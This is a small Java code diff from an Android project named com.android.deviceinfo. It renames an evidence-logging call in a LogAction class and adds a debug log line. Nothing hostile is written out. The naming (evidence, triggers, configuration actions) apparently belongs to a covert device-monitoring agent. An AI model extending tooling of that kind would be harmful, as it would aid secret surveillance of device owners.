@@ -13,7 +13,7 @@ import com.android.deviceinfo.Trigger;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfAction;
 import com.android.deviceinfo.conf.ConfigurationException;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.util.Check;
 
 
@@ -41,7 +41,10 @@ public class LogAction extends SubAction {
 	 */
 	@Override
 	public boolean execute(Trigger trigger) {
-		EvidenceReference.info(msg);
+		if(Cfg.DEBUG){
+			Check.log(TAG + " (LogAction) logging: "+ msg);
+		}
+		EvidenceBuilder.info(msg);
 
 		return true;
 	}
